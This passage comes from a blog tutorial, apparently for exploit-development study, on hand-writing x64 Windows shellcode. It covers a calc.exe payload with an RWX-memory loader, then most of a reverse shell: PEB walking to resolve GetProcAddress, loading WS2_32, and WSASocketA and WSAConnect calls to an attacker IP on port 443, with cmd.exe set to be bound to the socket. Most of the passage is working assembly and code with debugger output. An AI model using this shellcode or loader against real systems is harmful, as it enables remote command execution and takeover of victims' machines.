        "   add rax, r8;"                   # Convert function address RVA to absolute address
        "   mov r14, rax;"                  # Store the resolved function address in R14 for later use
        # WinExec Call
        "  xor rax, rax;"                   # Zero RAX to create a null byte
        "  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
        "  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
        "  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
        "  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
        "  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
        "  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
        "  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
        "  call r14;"                       # Call WinExec using the address stored in R14
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    # print("Attaching debugger to " + str(os.getpid()));
    # subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    # input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```
<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-02_07-00.png" alt="">

Gimme the Shell
---

Next, we will do something much more interesting than spawning the Windows calculator (no offense to mathematicians). The following procedure will be used: 

* Use the same method explained before to locate [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress){:target="_blank"} within Kernel32 module.
* Use `GetProcAddress` to obtain the address of `LoadLibraryA`.
* Call `LoadLibraryA` to load `WS2_32.DLL`, required for creating a network socket.
* Lookup the address of `WSAStartup`, necessary to initiate WinSock usage.
* Lookup the `WSASocketA` address and call the function to create a socket.
* Lookup and call `WSAConnect` to establish a connection.
* Lookup the address of `CreateProcessA` using `GetProcAddress`.
* Create the `STARTUPINFOA` structure, configuring `STD INPUT/OUTPUT/ERROR` to the socket handle.
* Call `CreateProcessA` to spawn cmd.exe connected to the socket.

The following diagram is created to explain the entire procedure to be followed:

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_04-00.png" alt="">

The following Python code is used to automate the conversion of a string into little endian hexadecimal format and then, generate x64 assembly instructions to push it onto the stack:

```python
import binascii
import sys
 
def encodeCommand(command):
    result = "".join("{:02x}".format(ord(c)) for c in command)
    ba = bytearray.fromhex(result)
    ba.reverse()
    ba.hex()
 
    input = ba.hex()
    input = input[::-1]
    n = 16
 
    byte_list = [input[i:i+n] for i in range(0, len(input), n)]
    for x in reversed(byte_list):
        print("mov rax, 0x" + x[::-1])
        print("push rax;")
 
 
string = sys.argv[1]
encodeCommand(string)
```

Subsequently, the string `WSAStartup` is encoded.

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py WSAStartup
mov rax, 0x7075
push rax;
mov rax, 0x7472617453415357
push rax;
```

### Find GetProcAddress

As mentioned above, instead of parsing the EAT to find the pointer to `WinExec`, it will be done for `GetProcAddress`.

```
" start: "
# "   int3;"                        # Breakpoint
# "  sub rsp, 0x208;"               # Free up space in the stack (Null Byte)
"   add rsp, 0xfffffffffffffdf8;"   # Free up space in the stack (Fix)
" locate_kernel32:"
"   xor rcx, rcx;"                  # Null RCX content
"   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
"   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
"   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
"   lodsq;"                         # Loads qword from RSI into RAX
"   xchg rax, rsi;"                 # Swap RAX & RSI
"   lodsq;"                         # Loads qword from RSI into RAX
"   mov rbx, [rax + 0x20];"         # RBX = Kernel32 base address
"   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
"   mov ebx, [rbx+0x3C];"           # Get offset to the PE header from the DOS header at offset 0x3C
"   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
# "   mov edx, [rbx+0x88];"         # Get Relative Virtual Address (RVA) of Export Address Table from PE header (Null Byte)
# Fix below
"   xor r12, r12;"                  # Zero out r12 to start fresh
"   add r12, 0x88FFFFF;"            # Load r12 with a large number
"   shr r12, 0x14;"                 # Right-shift r12 by 20 bits to get 0x88
"   mov edx, [rbx+r12];"            # Move the value at rbx+0x88 into edx
"   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
"   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
"   xor r11, r11;"                  # Zero out R11 to use it as a clean register
"   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
"   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
"   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
```

When making the comparison with the desired string in the function `kernel32findfunction`, it should be done using the string "`GetProcA`" due to character limitations and because the first match that occurs will be the function we seek.

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py GetProcAddress
mov rax, 0x737365726464
push rax;
mov rax, 0x41636f7250746547 # GetProcA
push rax;
```
The string is replaced in the function:

```
"kernel32findfunction: "
" jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
"   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
"   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
"   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
"   dec rcx;"                       # Decrement the loop counter
"   mov rax, 0x41636f7250746547;"  # Load the ASCII value of 'AcorPteG' into RAX for comparison
"   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'GetProcAddress'
"   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
"FunctionNameFound: "
# Entry point after finding the target function name 'GetProcAddress'
"   xor r11, r11;"
"   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
# Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
"   inc rcx;"
"   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
# Preparing to fetch the actual function address from AddressOfFunctions
"   xor r11, r11;"
"   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
"   mov eax, [r11+4+r13*4];"        # Fetch the function address RVA using the ordinal as an index
"   add rax, r8;"                   # Convert function address RVA to absolute address
"   mov r14, rax;"                  # Store the resolved function address in R14 for later use
```

As can be seen in the following screenshot, it is verified that register R14, points to the address of `GetProccessAddressStub`:

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_05-33.png" alt="">

### Load WS2_32.dll

To locate the address of `LoadLibraryA` to load the `WinSock` library, `GetProcAddress` (previously stored in register R14) is used. 
It is called with two parameters: the module base address (the previously resolved Kernel32 base) and the name of the function being looked up, which in this case would be `LoadLibraryA`. The function prototype for [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress){:target="_blank"} is provided below:

```cpp
FARPROC GetProcAddress(
  [in] HMODULE hModule,
  [in] LPCSTR  lpProcName
);
```

First, the string `LoadLibraryA` must be encoded.
```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py LoadLibraryA
mov rax, 0x41797261
push rax;
mov rax, 0x7262694c64616f4c
push rax;
```

Once generated, it can be implemented in Python code as follows:

```
# The following assembly instructions are used to resolve LoadLibraryA using GetProcAddress

" mov rcx, 0x41797261; "              # Load part of the string 'LoadLibra' into RCX
" push rcx; "                         # Push the first half of the string onto the stack
" mov rcx, 0x7262694c64616f4c; "      # Load the remaining part of the string 'LoadLibrary' into RCX
" push rcx; "                         # Push the second half of the string onto the stack
" mov rdx, rsp; "                     # Set RDX to point to the string 'LoadLibraryA' on the stack
" mov rcx, r8; "                      # Copy the base address of the Kernel32 module into RCX
" sub rsp, 0x30; "                    # Allocate space on the stack to preserve context for the call
" call r14; "                         # Call GetProcAddress, with R14 pointing to its address
" add rsp, 0x30; "                    # Clean up the stack after the call
" add rsp, 0x10; "                    # Adjust stack pointer to clean up the 'LoadLibraryA' string
" mov rsi, rax; "                     # Store the resolved address of LoadLibraryA into RSI
```
To ensure `WS2_32.dll` is loaded into the program's virtual address space, `LoadLibraryA` can be called with the name of the library as the sole parameter, as indicated in the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya){:target="_blank"}:

```cpp
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
```

The encoded value of `WS2_32.dll` is obtained:

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py WS2_32.dll
mov rax, 0x6c6c
push rax;
mov rax, 0x642e32335f325357
push rax;
```

Afterwards, the necessary actions are added in our python code:

```
# Call LoadLibraryA to load WS2_32.DLL 
" xor rax, rax;"                      # Clear RAX register
" mov rax, 0x6C6C; "                  # Load the last two characters "ll" into RAX
" push rax;"                          # Push "ll" onto the stack
" mov rax, 0x642E32335F325357;"       # Load "WS2_32.d" into RAX
" push rax;"                          # Push "WS2_32.d" onto the stack forming "WS2_32.dll"
" mov rcx, rsp;"                      # Set RCX to point to the string "WS2_32.dll" on the stack
" sub rsp, 0x30;"                     # Allocate 48 bytes on the stack to preserve context during the call
" call rsi;"                          # RSI holds the address of LoadLibraryA, so we proceed to call it
" mov r15, rax;"                      # Store the return value (module handle) in R15
" add rsp, 0x30;"                     # Restore the stack by removing the 48 bytes allocated
" add rsp, 0x10;"                     # Adjust stack to remove the space used by "WS2_32.dll"
```

It is checked in WinDBG if the module has been loaded correctly.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_06-54.png" alt="">

### Calling WSAStartup

As discussed previously, the first API we need to call is `WSAStartup` to initiate the use of the `Winsock` DLL by our shellcode. The function prototype is shown below:

```cpp
int WSAStartup(
  WORD wVersionRequested,
  LPWSADATA lpWSAData
);
```

Where:
* `wVersionRequested`: Specifies the version of the Winsock API that the application intends to use. The high byte indicates the minor version number; the low byte represents the major version. For instance, to request version 2.2, the hexadecimal value `0x0202` should be used for this parameter.
* `lpWSAData`: A pointer to a `WSADATA` structure, which Winsock fills with information about the Windows Sockets implementation, including version details and additional system information.

The function name once encoded looks as follows:

```
mov rax, 0x7075
push rax;
mov rax, 0x7472617453415357
push rax;
```

The implementation in Python code is illustrated below.

```
# Resolve WSAStartup Address
" mov rax, 0x7075;"                  # Load "up" into RAX
" push rax;"                         # Push the substring onto the stack
" mov rax, 0x7472617453415357;"      # Load "WSAStart" into RAX
" push rax;"                         # Push the complete function name onto the stack
" mov rdx, rsp; "                    # Move the stack pointer to RDX, pointing to "WSAStartup"
" mov rcx, r15; "                    # Copy the base address of WS2_32.dll from R15 to RCX
" sub rsp, 0x30; "                   # Allocate 48 bytes on the stack to maintain alignment
" call r14;"                         # Call GetProcAddress, which is stored in R14
" add rsp, 0x30; "                   # Clean up the allocated stack space
" add rsp, 0x10; "                   # Adjust stack to remove the space used by the string "WSAStartup"
" mov r12, rax; "                    # Store the address of WSAStartup in R12 for later use

# Initialize WSAStartup
" xor rcx, rcx; "                    # Clear RCX to prepare for value setting
" mov cx, 408; "                     # Set RCX to 408 (allocates 408 bytes on stack for lpWSAData)
" sub rsp, rcx; "                    # Allocate 408 bytes on the stack for lpWSAData
" lea rdx, [rsp]; "                  # Load Effective Address of the stack into RDX for lpWSAData
" mov cx, 514; "                     # Set wVersionRequested to 2.2 (0x0202 in hexadecimal)
" sub rsp, 88; "                     # Allocate additional space (88 bytes) on the stack for local variables or to maintain alignment
" call r12; "                        # Call WSAStartup using the address stored in R12
```

The function is then checked in WinDBG to see if it is loaded correctly.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_07-09.png" alt="">

### Calling WSASocket

The next step involves calling the WSASocketA API, responsible for socket creation. Here is the [function prototype](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa){:target="_blank"}:

```cpp
SOCKET WSAAPI WSASocketA(
  [in] int                 af,
  [in] int                 type,
  [in] int                 protocol,
  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
  [in] GROUP               g,
  [in] DWORD               dwFlags
);
```

Where:

* `af`: Specifies the address family. This determines the type of addresses that the socket can communicate with (e.g., `AF_INET` for IPv4, `AF_INET6` for IPv6). In this case, `AF_INET` will be used.
* `type`: Defines the type of socket. Common types include `SOCK_STREAM` for a TCP socket and `SOCK_DGRAM` for a UDP socket.
* `protocol`: Indicates the protocol to be used with the socket. For TCP, the protocol is `IPPROTO_TCP`, and for UDP, it is `IPPROTO_UDP`.
* `lpProtocolInfo`: A pointer to a `WSAPROTOCOL_INFOA` structure that provides additional details about the protocol, address family, and type. This parameter can be `NULL` if default settings are used.
* `g`: Specifies the group ID for the new socket. This is usually set to `NULL` unless the socket is part of a socket group.
* `dwFlags`: Socket attribute flags that can affect the behavior of the socket. Common flags include `WSA_FLAG_OVERLAPPED` for asynchronous sockets and `WSA_FLAG_NO_HANDLE_INHERIT` to prevent inheritance of the socket by child processes.

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py WSASocketA
mov rax, 0x4174
push rax;
mov rax, 0x656b636f53415357
push rax;
```

The implementation of the Python code is presented below:

```
# Resolve WSASocketA Address
" mov rax, 0x4174;"                  # Load part of the function name "tA" into RAX
" push rax;"                         # Push the substring onto the stack
" mov rax, 0x656b636f53415357;"      # Load "WSASocke" into RAX
" push rax;"                         # Push the complete function name "WSASocketA" onto the stack
" mov rdx, rsp; "                    # Move the stack pointer to RDX, pointing to "WSASocketA"
" mov rcx, r15; "                    # Copy the base address of WS2_32.dll from R15 to RCX
" sub rsp, 0x30; "                   # Allocate 48 bytes on the stack to maintain alignment
" call r14;"                         # Call GetProcAddress, which is stored in R14
" add rsp, 0x30; "                   # Clean up the allocated stack space
" add rsp, 0x10; "                   # Adjust stack to remove the space used by the string "WSASocketA"
" mov r12, rax; "                    # Store the address of WSASocketA in R12 for later use


# Allocate stack space and initialize socket creation with WSASocketA
" add rsp, 0xfffffffffffffdf8;"    # Free up space in the stack
" xor rdx, rdx;"                   # Zero out RDX (used as 'dwFlags' which is NULL in this context)
" sub rsp, 88;"                    # Additional stack allocation, possibly for local variables or alignment
" mov [rsp+32], rdx;"              # Set parts of the stack frame to zero, likely part of protocol info or alignment padding
" mov [rsp+40], rdx;"              # Another part of stack zeroing, further preparation for call parameters
" inc rdx;"                        # Increment RDX to use as 'af', typically AF_INET (value 2 after increment)
" mov rcx, rdx;"                   # Move RDX to RCX, set 'af' parameter for the socket
" inc rcx;"                        # Increment RCX to use as 'type', typically SOCK_STREAM (value 3 after increment)
" xor r8, r8;"                     # Zero out R8, used for 'protocol' (0 indicates default protocol for type)
" add r8, 6;"                      # Set R8 to 6, corresponding to IPPROTO_TCP typically
" xor r9, r9;"                     # Zero out R9, used for 'g' parameter (group ID, 0 indicates no group)
" mov r9w, 98*4;"                  # Set R9W (lower 16 bits of R9) to 392, potentially a custom or undefined flag
" mov ebx, [r15+r9];"              # Load a value from memory into EBX, possibly related to 'dwFlags' or another parameter offset
" xor r9, r9;"                     # Zero out R9 again, prepare for 'dwFlags' (0 indicates default behavior)
" call r12;"                       # Call WSASocketA, address stored in R12
" mov r13, rax;"                   # Store the return value (socket handle) in R13
" sub rsp, 0xfffffffffffffdf8;"    # Free up space in the stack
```

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_10-29.png" alt="">

### Calling WSAConnect

With the socket now established, the next step involves calling `WSAConnect` to set up a connection between two socket applications. As with previous API calls, the [function prototype](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect){:target="_blank"} is examined below:

```cpp
int WSAAPI WSAConnect(
  [in]  SOCKET         s,
  [in]  const sockaddr *name,
  [in]  int            namelen,
  [in]  LPWSABUF       lpCallerData,
  [out] LPWSABUF       lpCalleeData,
  [in]  LPQOS          lpSQOS,
  [in]  LPQOS          lpGQOS
);
```

Where:

* `s`: This is the descriptor identifying an unconnected socket. It specifies the local socket that will be used to establish the connection.
* `sockaddr`: A pointer to the sockaddr structure that contains the address of the target socket (the remote address) to which the connection should be made. This includes IP address and port number.

At this point it is necessary to explain the [sockaddr](https://learn.microsoft.com/en-us/windows/win32/winsock/sockaddr-2){:target="_blank"} structure in greater depth.

```cpp
struct sockaddr {
        ushort  sa_family;
        char    sa_data[14];
};

struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
```

The first element in the structure is `sin_family`, which specifies the address family for the transport address. According to official documentation, this value should always be set to `AF_INET`. The next member is `sin_port`, which, as suggested by the name, indicates the port number. Next is `sin_addr`, a nested structure of the type [IN_ADDR](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr){:target="_blank"}, designed to store the IP address used to initiate the connection to. The way IP addresses are integrated varies, though in memory, these structures appear identical, allowing the IP address to be stored directly within a `DWORD`, as illustrated here:

```cpp
struct in_addr {
  union {
    struct {
      u_char s_b1;
      u_char s_b2;
      u_char s_b3;
      u_char s_b4;
    } S_un_b;
    struct {
      u_short s_w1;
      u_short s_w2;
    } S_un_w;
    u_long S_addr;
  } S_un;
};
```

The last member of the `sockaddr_in` structure is `sin_zero`, an array of 8 characters. As per the official documentation, this array is reserved for system use, and its content should always be set to 0. With the `sockaddr_in` and `IN_ADDR` structures explained, a reexamination of the `WSAConnect` function prototype is presented:

```cpp
int WSAAPI WSAConnect(
  [in]  SOCKET         s,
  [in]  const sockaddr *name,
  [in]  int            namelen,
  [in]  LPWSABUF       lpCallerData,
  [out] LPWSABUF       lpCalleeData,
  [in]  LPQOS          lpSQOS,
  [in]  LPQOS          lpGQOS
);
```

* `namelen`: This is the length, in bytes, of the address pointed to by the name parameter.
* `lpCallerData`: A pointer to a WSABUF structure containing optional data to be sent to the remote party as part of establishing the connection. This parameter can be NULL if no data is to be sent.
* `lpCalleeData`: A pointer to a WSABUF structure in which data received from the remote party will be stored, as part of the connection establishment. This parameter can also be NULL if no data is expected in response.
* `lpSQOS`: A pointer to a QOS structure that specifies the flow specifications for the socket, the service provider, and any routers. QOS stands for Quality of Service, which includes parameters such as service type, token rate, etc. This structure influences the quality of service provided by the network. If no special quality of service is requested, this parameter can be NULL.
* `lpGQOS`: Similar to lpSQOS, this is a pointer to a QOS structure, but it specifies the quality of service for general socket operations and for the receiving end of the connection. It is used for controlling the network traffic properties. This parameter can also be NULL if no specific quality of service is required.

Before updating the shellcode, the IP address "192.168.243.133" and port of the attacker machine, which will receive the connection, must be converted to the correct format.


<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_12-08.png" alt="">

First, the encoded string `WSAConnect` is obtained:

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py WSAConnect
mov rax, 0x7463
push rax;
mov rax, 0x656e6e6f43415357
push rax;
```

Subsequently, the address of the function is retrieved through `GetProcAddress`.

```
# Resolve WSAConnect Address
" mov rax, 0x7463;"                  # Load the second part of "WSAConnect" into RAX
" push rax;"                         # Push the second part onto the stack
" mov rax, 0x656e6e6f43415357;"      # Load the first part of "WSAConnect" into RAX
" push rax;"                         # Push the first part onto the stack, completing "WSAConnect"
" mov rdx, rsp; "                    # Set RDX to the stack pointer, pointing to "WSAConnect"
" mov rcx, r15; "                    # Move the base address of WS2_32.dll (stored in R15) into RCX
" sub rsp, 0x30; "                   # Allocate 48 bytes on the stack to preserve the stack state
" call r14;"                         # Call GetProcAddress, whose address is stored in R14
" add rsp, 0x30; "                   # Deallocate the 48 bytes from the stack
" add rsp, 0x10; "                   # Adjust the stack to clean up after the string "WSAConnect"
" mov r12, rax; "                    # Store the address of WSAConnect in R12 for later use
```

The status of the `WSAConnect` module is verified in `WinDBG` to confirm it has started correctly:

```
0:003> x ws2_32!WSAConnect
00007ff9`65ce0130 WS2_32!WSAConnect (WSAConnect)
```

The function is then called to establish a connection.

```
# Initiate a connection using WSAConnect
" mov rcx, r13;"          # Set the first parameter, our socket handle, to RCX
" sub rsp, 0x208;"        # Allocate 520 bytes on the stack for local storage
" xor rax, rax;"          # Zero out RAX
" inc rax; "              # Increment RAX twice to set it to 2 (AF_INET)
" inc rax; "
" mov [rsp], rax;"        # Set AF_INET (2) at the top of the stack
" mov rax, 0xbb01;"       # Set RAX to the port number in little endian (443 in big endian)
" mov [rsp+2], rax; "     # Store the port number at RSP+2
" mov rax, 0x85f3a8c0;"   # Set RAX to the IP address in little endian (192.168.243.133”in big endian)
" mov [rsp+4], rax; "     # Store the IP address at RSP+4
" lea rdx, [rsp];"        # Load the address of the sockaddr structure into RDX
" mov r8, 0x16; "         # Set the namelen parameter (size of the sockaddr structure) to R8
" xor r9, r9;"            # Zero out R9 to use for lpCallerData, lpCalleeData, lpSQOS, lpGQOS
" push r9;"               # Push NULL for lpCallerData
" push r9;"               # Push NULL for lpCalleeData
" push r9;"               # Push NULL for lpSQOS
" sub rsp, 0x88; "        # Make additional space on the stack for alignment
" call r12;"              # Call WSAConnect using the address stored in R12
```

Before stepping over the call and inspecting the return value, a Netcat listener should be started on the attacker machine. Although the reverse shell is not yet complete, this API call is designed to initiate the connection, which can be intercepted using Netcat. Should the connection fail, the API will time out.

```
0:003> r
rax=0000000000000000 rbx=0000000000058000 rcx=0000000000000000
rdx=0000000000000003 rsi=00007ff964160800 rdi=0000000000000000
rip=000001af4ed3021a rsp=00000046307bf1e0 rbp=0000000000000000
 r8=00000046307becb8  r9=00000000000000a8 r10=0000000000000000
r11=00000046307bf1d0 r12=00007ff965ce0130 r13=000000000000021c
r14=00007ff96415b1d0 r15=00007ff965cb0000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
000001af`4ed3021a 0000            add     byte ptr [rax],al ds:00000000`00000000=??
```

After stepping over the function, it is observed that the return value is `0`. According to the official documentation, this indicates a successful call. The success of the call can be confirmed by switching to the attacker machine, where Netcat should be receiving a connection:

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_12-22.png" alt="">

### Calling CreateProcessA

Now that a connection has been successfully initiated, the next step is to start a cmd.exe process and redirect its input and output through the established connection. The `CreateProcessA` API will be utilized to create a new process, as implied by its name. Below, the [function prototype](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa){:target="_blank"} is examined to better understand the required parameters:

```cpp
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

Where:

* `lpApplicationName`: Specifies the module to be executed, typically an executable path, or NULL if the command line specifies the executable. In this case, the shellcode will use this parameter to run `cmd.exe`
* `lpCommandLine`: Provides the command line arguments for the application being executed. If `lpApplicationName` is NULL, the command line must include the full path to the executable. The data may be modified by the function.
* `lpProcessAttributes`: Pointer to a security attributes structure that determines whether the returned handle to the new process can be inherited by child processes. Can be NULL for default security.
* `lpThreadAttributes`: Pointer to a security attributes structure for the main thread of the new process. It also controls the inheritance of the handle.
* `bInheritHandles`: Indicates whether each inherited handle can be inherited by the new process’s child processes. Set to TRUE if handles need to be inherited. If set to NULL, the `cmd.exe` process will inherit the flags from the calling process.
* `dwCreationFlags`: Flags that control the priority and the creation of the process. Common flags include `CREATE_NEW_CONSOLE` and `CREATE_SUSPENDED`.
* `lpEnvironment`: Pointer to the environment block for the new process. If `NULL`, the new process uses the parent’s environment.
* `lpCurrentDirectory`: Pointer to a null-terminated string that specifies the directory used as the current directory for the process. If this parameter is `NULL`, the new process will have the same current directory as the calling process. As `cmd.exe` is included in the PATH, it can be launched from any location, although this parameter may be necessary depending on which process the shellcode operates within.

The final two parameters, `lpStartupInfo` and `lpProcessInformation`, necessitate pointers to the [STARTUPINFOA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa){:target="_blank"} and [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information){:target="_blank"} structures, respectively.

Given that the `PROCESS_INFORMATION` structure will be filled out by the API, it is only necessary to be aware of the structure’s size. In contrast, the `STARTUPINFOA` structure must be actively configured and supplied to the API by the shellcode. This requires a detailed examination and appropriate setup of the structure’s members before passing it to the API.

```cpp
typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```

The official documentation indicates that only a few members of the `STARTUPINFOA` structure need specific values set; the rest can be set to `NULL`.

The first member to set is `cb`, which is the size of the structure. This value can be calculated using publicly available symbols and WinDbg.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_17-16.png" alt="">

The second critical member is `dwFlags`. This determines whether certain members of the `STARTUPINFOA` structure are utilized when the process creates a window. This member should be set to the `STARTF_USESTDHANDLES` flag. This setting activates the `hStdInput`, `hStdOutput`, and `hStdError` members, which are essential for managing input and output in a reverse shell, as will be explained shortly.

Since the `STARTF_USESTDHANDLES` flag is used, the `hStdInput`, `hStdOutput`, and `hStdError` members must be assigned handles. These handles manage input, output, and error streams, respectively. For interacting with the `cmd.exe` process through a socket, the socket descriptor obtained from the `WSASocketA` API call can be used as the handle. Additionally, to ensure these handles are inheritable, the `bInheritHandles` parameter must be set to `TRUE`.

With a better understanding of the API prototype and the structures it uses, we continue by integrating the necessary components into our shellcode as has been done in previous steps.

1. Encode the string "CreateProcessA".

    ```
    PS C:\Users\s4dbrd\Desktop> python .\encodeString.py CreateProcessA
    mov rax, 0x41737365636f
    push rax;
    mov rax, 0x7250657461657243
    push rax;
    ```

2. Retrieve the address of the function using GetProcAddress.

    ```
    # Find CreateProcessA address in kernel32.dll
    " xor rcx, rcx;"                  # Zero out RCX contents
    " mov rax, gs:[rcx + 0x60];"      # Retrieve the Process Environment Block (PEB) address into RAX from the GS register.
    " mov rax, [rax + 0x18];"         # Access the Ldr (PEB Loader Data) from the PEB.
    " mov rsi, [rax + 0x20];"         # Get the InMemoryOrderModuleList from the Ldr which lists loaded modules.
    " lodsq;"                         # Load the next module address (the first entry in the module list) into RAX from the address pointed to by RSI.
    " xchg rax, rsi;"                 # Swap RAX and RSI to prepare for the next load.
    " lodsq;"                         # Load the next module address into RAX; RSI now points to the second module.
    " mov rbx, [rax + 0x20];"         # Retrieve the base address of kernel32.dll from the second module's base address field.
    " mov r8, rbx; "                  # Copy kernel32.dll's base address to R8 for later use.
    
    # Find address for CreateProcessA. Store in R12 (previously stored WSAConnect)
    " mov rax, 0x41737365636f;"       # Load "Asseco" onto RAX
    " push rax;"
    " mov rax, 0x7250657461657243;"   # Load "rPetaerC" onto RAX
    " push rax;"                      # Push the string 'CreateProcessA' onto the stack
    " mov rdx, rsp; "                 # Point RDX to the top of the stack, where 'CreateProcessA' string starts.
    " mov rcx, r8; "                  # Move the base address of kernel32.dll into RCX for GetProcAddress.
    " sub rsp, 0x30; "                # Allocate space on the stack to preserve context for the call.
    " call r14;"                      # Call GetProcAddress, with the address in R14.
    " add rsp, 0x30; "                # Deallocate the stack space reserved earlier.
    " add rsp, 0x10; "                # Clean up the stack by removing the 'CreateProcessA' string.
    " mov r12, rax; "                 # Store the address of CreateProcessA in R12 for later use.
    ```

Subsequently, the string "cmd.exe" is encoded:

```
PS C:\Users\s4dbrd\Desktop> python .\encodeString.py cmd.exe
mov rax, 0x6578652e646d63
push rax;
```

